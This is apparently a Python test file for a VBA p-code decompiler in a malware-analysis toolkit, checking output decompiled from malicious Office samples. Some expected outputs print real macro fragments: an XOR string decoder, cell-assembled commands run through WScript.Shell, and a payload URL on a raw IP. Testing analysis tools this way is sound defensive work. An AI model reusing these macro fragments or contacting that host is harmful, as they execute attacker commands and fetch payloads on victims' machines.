import collections
import inspect
import re
import lzma
import functools

from refinery.lib.ole.decompiler import vba_string_literal
from refinery.lib.ole.vba import copytoken_help

from ... import TestUnitBase
from .. import replace_in_ole_stream, resize_ole_entry
from . import (
    DOC,
    DOCM,
    DOCX,
    STOMPED_DOCM,
    XLS,
    VBAUnitTestBase,
    invert_checksum,
    list_part_twice,
)

proc_new = re.compile(
    r'(?i)^\s*(((Public|Private|Friend)\s+)?(Static\s+)?(Sub|Function(?!\s+As\b)|Property\s+(Get|Let|Set)))\b')
proc_end = re.compile(
    r'(?i)^\s*End\s+(Sub|Function|Property)\b')


class TestVBAPC(VBAUnitTestBase):

    def test_maldoc_01(self):
        data = self.download_sample('4bdc8e660ff4fb05e5b6c0a2dd70c537817f46ac3270d779fdddc8e459829c08')
        unit = self.load()
        code = list(data | unit)
        self.assertTrue(any(
            B'http://109.94.209'B'.91/12340.txt' in c for c in code))

    def test_the_decompiler_is_freed_without_the_collector(self):
        from refinery.lib.ole.decompiler import VBADecompiler
        data = self.download_sample('4bdc8e660ff4fb05e5b6c0a2dd70c537817f46ac3270d779fdddc8e459829c08')
        unit = self.load()
        with self.assertNoInstanceSurvives(VBADecompiler):
            self.assertTrue(data | unit | [])

    def test_maldoc_02(self):
        data = self.download_sample('ee103f8d64cd8fa884ff6a041db2f7aa403c502f54e26337c606044c2f205394')
        unit = self.load()
        code = list(data | unit)
        self.assertTrue(any(
            B'ActiveDocument.Content.Find.Execute FindText:="$1", ReplaceWith:=dowKarolYou, Replace:=wdReplaceAll' in c for c in code))

    def test_stomped_document_01(self):
        data = self.download_sample('6d8a0f5949adf37330348cc9a231958ad8fb3ea3a3d905abe5e72dbfd75a3d1d')
        unit = self.load()
        code = str(data | unit)
        goal = inspect.cleandoc(
            """
            Function justify_text_to_left(dt As String) As String
              On Error Resume Next
              Dim ks As String
              ks = page_border_width
              Dim dl As Long
              dl = ((Len(dt) / 2) - 1)
              kl = Len(ks)
              Dim s As String
              s = ""
              For i = 0 To dl
                Dim c1 As Integer
                Dim c2 As Integer
                c1 = Val("&H" & Mid(dt, ((i * 2) + 1), 2))
                c2 = Asc(Mid(ks, (i Mod kl) + 1, 1))
                s = s & Chr(c1 Xor c2)
              Next
              justify_text_to_left = s
            End Function
            """
        )
        self.assertIn(goal, code)

    @functools.lru_cache(maxsize=1)
    def _get_big_sample(self):
        compressed = self.download_sample('0baeac0475eb0e0ba51796cb9b303bae3bfc62c4dc10422146f37f72d7cbe823')
        return lzma.decompress(compressed)

    def _get_module(self, data: bytes, module_path: str) -> str:
        unit = self.load()
        for chunk in data | unit:
            if F'{chunk.meta["path"]}' == module_path:
                return bytes(chunk).decode('utf-8')
        self.fail(F'module not found: {module_path}')

    def test_indentation_inside_procedure_body(self):
        data = self.download_sample('63263c3b7aa5112510b3dbe9fd8a9d2cdd447d80067ba7ac49d6b183c259442d')
        goal = inspect.cleandoc(
            """
            Sub print_page()
              MsgBox "", Title:="VIEW": ActiveWorkbook.Close False
            End Sub

            Sub selectr()
              F = 2
              For Each A In [A1:IV5000].SpecialCells(xlConstants)
                If Len(A) > F Then dated = dated & Mid(A.Text, F, 1)
                Next: On Error Resume Next
              Debug.Print Replace((CurDir(F)(CreateObject("Wscript.shell").exec@(dated).For())), 987345#, F)
            End Sub

            Private Sub subA_Layout(ByVal Index As Long)
              t = "": selectr: bb = 9
            End Sub
            """
        )
        test = '\n'.join(data | self.load() | [str]).strip()
        self.assertEqual(test, goal)

    def test_next_keyword_indentation(self):
        data = self.download_sample('8168819cb693a3a04f771ee119ca00e631a74f09419ad295c5088f1e7a430e98')
        goal = inspect.cleandoc(
            '''
            Function for1()
              bh = 2
              for1 = ""
              for1 = for1 + Cells(48 + bh, bh)
              Next i
            End Function

            Sub subb()
              On Error Resume Next
              WScript.Quit CreateObject("WScript.Shell").Run(subs(50, 2, 11988), 0, False)
              On Error GoTo 0
            End Sub

            Function subs(g, yg, charss As Integer)
              Dim W(): Dim E As Integer
              formss = Cells(g, yg)
              For city = 1 To Len(formss)
                ReDim Preserve W(city)
                W(city) = Mid(formss, city, 1)
              Next
              Booleans = ""
              For E = 0 To charss Step 4
                Booleans = Booleans + W(E)
              Next E
              subs = Booleans
            End Function

            Private Sub page1_Layout(ByVal Index As Long)
              ThisWorkbook.subb
            End Sub

            Private Sub your_Click()
              page1_Layout
            End Sub
            '''
        )
        test = '\n'.join(data | self.load() | [str]).strip()
        self.assertEqual(test, goal)

    def test_no_orphan_end_from_ifdef(self):
        data = self._get_big_sample()
        code = self._get_module(data, 'TemplateProject/APIRegistryUtil')
        depth = 0
        for lno, line in enumerate(code.splitlines(), 1):
            if proc_new.match(line):
                depth += 1
            if proc_end.match(line):
                self.assertGreater(depth, 0, F'At line {lno}: depth regressed to negative')
                depth -= 1

    def test_no_runaway_indentation(self):
        data = self._get_big_sample()
        code = self._get_module(data, 'TemplateProject/BBPT_modExcelLinkHandler')
        max_indent = 0
        for line in code.splitlines():
            if line.strip():
                indent = len(line) - len(line.lstrip(' '))
                if indent > max_indent:
                    max_indent = indent
        self.assertLessEqual(max_indent, 20,
            F'maximum indentation is {max_indent} spaces ({max_indent // 2} levels); '
            F'this suggests runaway indent escalation from #If/#Else blocks')

    def test_no_single_line_select_at_zero_indent(self):
        data = self.download_sample('0f822b8f6b34755495585f3c22689081edc3300c2700fc0b69a35061db768700')
        code = self._get_module(data, 'VBAProject/Module2')
        select_re = re.compile(r'(?i)^Select Case .+End Select')
        for lno, line in enumerate(code.splitlines(), 1):
            self.assertIsNone(select_re.match(line), F'At line {lno}: single-line Select without indentation')

    def _assert_procedure_bodies_indented(self, code: str):
        inside = False
        for lno, line in enumerate(code.splitlines(), 1):
            if not inside:
                if proc_new.match(line):
                    inside = True
            elif proc_end.match(line):
                inside = False
            elif (stripped := line.strip()) and not stripped.startswith('#'):
                self.assertTrue(line.startswith(' '),
                    F'At line {lno}: line should be indented but does not start with a space')

    def _assert_all_procedure_bodies_indented(self, data: bytes):
        for chunk in data | self.load():
            code = bytes(chunk).decode('utf-8')
            if not code.strip():
                continue
            path = str(chunk.meta["path"])
            with self.subTest(module=path):
                self._assert_procedure_bodies_indented(code)

    def test_no_zero_indent_in_big_sample(self):
        self._assert_all_procedure_bodies_indented(self._get_big_sample())

    def test_block_indentation_consistency(self):
        self._assert_all_procedure_bodies_indented(self.download_sample(
            '0f822b8f6b34755495585f3c22689081edc3300c2700fc0b69a35061db768700'))

    def test_next_multi_var_indentation(self):
        data = self.download_sample('2052b1c9455383827cc6d14da43249fd2172e6bdd82e1b782383391ac36baceb')
        code = self._get_module(data, 'VBAProject/ThisWorkbook')
        for lno, line in enumerate(code.splitlines(), 1):
            if not (m := proc_end.match(line)):
                continue
            indent = len(line) - len(line.lstrip(' '))
            self.assertEqual(indent, 0, F'At line {lno}: illegal {indent}-indent before {m[0]}')

    def test_no_trailing_whitespace_on_resume(self):
        data = self._get_big_sample()
        code = self._get_module(data, 'TemplateProject/BBPTv2_modPasteFromExcel')
        for lno, line in enumerate(code.splitlines(), 1):
            stripped = line.rstrip()
            self.assertFalse(stripped != line and stripped.endswith('Resume'),
                F'At line {lno}: Bare "Resume" with trailing whitespace')

    def test_every_project_of_a_document_that_lists_its_project_twice_is_disassembled(self):
        first = self.download_sample('ee103f8d64cd8fa884ff6a041db2f7aa403c502f54e26337c606044c2f205394')
        second = self._project(STOMPED_DOCM)
        doubled = list_part_twice(first, 'word/vbaProject.bin', lambda _: second)
        expected = collections.Counter(bytes(chunk) for chunk in first | self.load())
        expected.update(bytes(chunk) for chunk in second | self.load())
        self.assertEqual(collections.Counter(bytes(chunk) for chunk in doubled | self.load()), expected)

    def test_the_modules_of_a_project_come_out_below_the_name_of_the_project(self):
        for sample, paths in [
            (DOC, ['Project/ThisDocument', 'Project/UserForm1', 'Project/Module1']),
            (XLS, ['VBAProject/ThisWorkbook', 'VBAProject/Sheet1']),
            (DOCM, ['Project/ThisDocument', 'Project/main']),
        ]:
            with self.subTest(sample=sample[:8]):
                self.assertEqual(list(self._modules(self.download_sample(sample))), paths)

    def test_two_projects_with_one_name_get_a_numbered_folder_each(self):
        other = self._project(STOMPED_DOCM)
        data = self._with_embedded(other)
        own = self._modules(self.download_sample(DOCM))
        embedded = self._modules(other)
        self.assertEqual(list(own), ['Project/ThisDocument', 'Project/main'])
        self.assertEqual(list(embedded), ['Project/ThisDocument'])
        expected = {F'1/{path}': code for path, code in own.items()} | {F'2/{path}': code for path, code in embedded.items()}
        self.assertEqual(self._modules(data), expected)

    def test_a_module_path_without_the_number_selects_the_module_of_every_project(self):
        data = self._with_embedded(self._project(STOMPED_DOCM))
        self.assertEqual(list(self._modules(data, 'Project/ThisDocument')), ['1/Project/ThisDocument', '2/Project/ThisDocument'])
        self.assertEqual(list(self._modules(data, '1/Project/ThisDocument')), ['1/Project/ThisDocument'])

    def test_an_embedded_project_with_another_name_is_disassembled(self):
        workbook = self.download_sample(XLS)
        modules = self._modules(self._with_embedded(workbook))
        self.assertEqual(list(modules), [
            '1/Project/ThisDocument',
            '1/Project/main',
            '2/VBAProject/ThisWorkbook',
            '2/VBAProject/Sheet1',
        ])
        expected = {F'2/{path}': code for path, code in self._modules(workbook).items()}
        self.assertEqual({path: code for path, code in modules.items() if path.startswith('2/')}, expected)

    def test_a_project_name_with_a_slash_is_used_as_stored(self):
        project = replace_in_ole_stream(self._project(DOCM), 'VBA/dir', B'Project', B'Pro/ect')
        self.assertEqual(list(self._modules(project)), ['Pro/ect/ThisDocument', 'Pro/ect/main'])

    def test_the_stream_variable_names_the_part_and_the_stream_of_every_module(self):
        data = self._with_embedded(self.download_sample(XLS))
        self.assertEqual(self._streams(data), [
            'word/vbaProject.bin/VBA/ThisDocument',
            'word/vbaProject.bin/VBA/main',
            'word/embeddings/oleObject1.bin/_VBA_PROJECT_CUR/VBA/ThisWorkbook',
            'word/embeddings/oleObject1.bin/_VBA_PROJECT_CUR/VBA/Sheet1',
        ])
        self.assertEqual(self._streams(self.download_sample(DOC)), [
            'Macros/VBA/ThisDocument',
            'Macros/VBA/UserForm1',
            'Macros/VBA/Module1',
        ])

    def test_the_header_of_raw_pcode_names_the_stream_of_the_module(self):
        modules = self._modules(self._with_embedded(self.download_sample(XLS)), raw=True)
        header = modules['2/VBAProject/ThisWorkbook'].splitlines()[0]
        self.assertTrue(header.startswith(B'word/embeddings/oleObject1.bin/_VBA_PROJECT_CUR/VBA/ThisWorkbook - '), header)

    def test_a_project_whose_dir_stream_is_cut_short_is_skipped_with_a_warning(self):
        data = self._with_embedded(resize_ole_entry(self._project(STOMPED_DOCM), 'VBA/dir', 100))
        modules, log = self._logged_modules(data)
        self.assertEqual(modules, self._modules(self.download_sample(DOCM)))
        self.assertTrue(any('word/embeddings/oleObject1.bin/VBA/dir' in message for message in log), log)

    def test_a_dir_stream_cut_inside_its_last_module_record_keeps_the_modules_in_front_of_it(self):
        project = self._project(DOCM)
        intact = self._modules(project)
        modules, log = self._logged_modules(resize_ole_entry(project, 'VBA/dir', 707))
        self.assertEqual(modules, {'Project/ThisDocument': intact['Project/ThisDocument']})
        self.assertTrue(any('VBA/dir' in message for message in log), log)

    def test_an_unreadable_part_is_skipped_with_a_warning(self):
        data = invert_checksum(self._with_embedded(self.download_sample(XLS)), 'word/vbaProject.bin')
        modules, log = self._logged_modules(data)
        self.assertEqual(modules, self._modules(self.download_sample(XLS)))
        self.assertTrue(any('word/vbaProject.bin' in message for message in log), log)

    def test_a_module_stream_cut_short_is_skipped_with_a_warning(self):
        project = self._project(DOCM)
        intact = self._modules(project)
        modules, log = self._logged_modules(resize_ole_entry(project, 'VBA/ThisDocument', 2))
        self.assertEqual(modules, {'Project/main': intact['Project/main']})
        self.assertTrue(any('VBA/ThisDocument' in message for message in log), log)

    def test_a_compound_file_that_cannot_be_opened_is_an_error(self):
        data = self.download_sample(DOC)[:0x1000]
        with self.assertRaises(EOFError):
            list(data | self.load())

    def test_a_document_without_macros_gives_nothing(self):
        self.assertEqual(list(self.download_sample(DOCX) | self.load()), [])

    def test_the_format_check_accepts_a_macro_document(self):
        self.assertTrue(self.unit().handles(self.download_sample(DOCM)))


class TestVBAStringLiteral(TestUnitBase):
    def test_plain_string(self):
        self.assertEqual(vba_string_literal('hello'), '"hello"')

    def test_empty_string(self):
        self.assertEqual(vba_string_literal(''), '""')

    def test_embedded_quotes(self):
        self.assertEqual(vba_string_literal('say "hi"'), '"say ""hi"""')

    def test_single_lf(self):
        self.assertEqual(vba_string_literal('\n'), 'vbLf')

    def test_single_cr(self):
        self.assertEqual(vba_string_literal('\r'), 'vbCr')

    def test_crlf(self):
        self.assertEqual(vba_string_literal('\r\n'), 'vbCrLf')

    def test_tab(self):
        self.assertEqual(vba_string_literal('\t'), 'vbTab')

    def test_null_char(self):
        self.assertEqual(vba_string_literal('\0'), 'vbNullChar')

    def test_text_with_lf(self):
        self.assertEqual(vba_string_literal('hello\nworld'), '"hello" & vbLf & "world"')

    def test_text_with_crlf(self):
        self.assertEqual(vba_string_literal('hello\r\nworld'), '"hello" & vbCrLf & "world"')

    def test_trailing_control(self):
        self.assertEqual(vba_string_literal('hello\n'), '"hello" & vbLf')

    def test_leading_control(self):
        self.assertEqual(vba_string_literal('\nhello'), 'vbLf & "hello"')

    def test_adjacent_controls(self):
        self.assertEqual(vba_string_literal('\n\t'), 'vbLf & vbTab')

    def test_all_controls_no_text(self):
        self.assertEqual(vba_string_literal('\r\n\t\0'), 'vbCrLf & vbTab & vbNullChar')

    def test_multiple_segments(self):
        self.assertEqual(vba_string_literal('a\nb\tc'), '"a" & vbLf & "b" & vbTab & "c"')


class TestCopyTokenHelp(TestUnitBase):
    def test_zero_difference_clamps_to_minimum(self):
        # A CopyToken appearing before any literal in a chunk yields difference 0;
        # the bit count must clamp to the 4-bit minimum instead of raising on log(0).
        self.assertEqual(copytoken_help(0, 0), (0x0FFF, 0xF000, 4, 0x1002))

    def test_one_difference_clamps_to_minimum(self):
        self.assertEqual(copytoken_help(1, 0), (0x0FFF, 0xF000, 4, 0x1002))
